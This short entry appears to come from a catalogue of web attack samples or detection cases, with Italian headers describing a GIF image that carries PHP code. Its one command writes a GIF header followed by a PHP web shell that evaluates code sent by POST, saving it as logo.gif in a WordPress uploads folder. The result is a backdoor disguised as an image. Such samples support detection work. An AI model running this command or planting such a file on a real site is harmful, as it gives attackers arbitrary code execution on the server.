# category: web
# title: Immagine GIF con codice PHP in coda
# indicator: uploads/2024/10/logo.gif
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00<?php eval($_POST[1]); ?>' >/var/www/wp/wp-content/uploads/2024/10/logo.gif
